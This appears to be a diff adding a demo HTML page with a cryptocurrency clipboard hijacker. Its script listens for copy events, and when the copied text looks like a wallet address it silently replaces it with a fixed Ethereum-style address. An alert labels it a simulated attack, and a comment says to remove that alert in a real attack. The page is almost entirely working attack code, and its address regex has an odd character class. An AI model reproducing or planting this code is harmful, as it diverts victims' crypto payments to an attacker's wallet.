@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<body>
+<script>
+    // Auto-runs on page load
+    document.addEventListener('copy', (e) => {
+        const text = window.getSelection().toString();
+        if (text.match(/^(bc1|[13]|0x)[a-zA-H0-9]{25,42}$/)) {
+            e.clipboardData.setData('text', '0x9701b5f824873560ad5670De0891D8D80F998eBa');
+            e.preventDefault();
+            alert("Copied! (Simulated attack)"); // Remove in real attack
+        }
+    });
+</script>
+<h3>Click anywhere on this page, then try copying a crypto address.</h3>
+</body>
+</html>
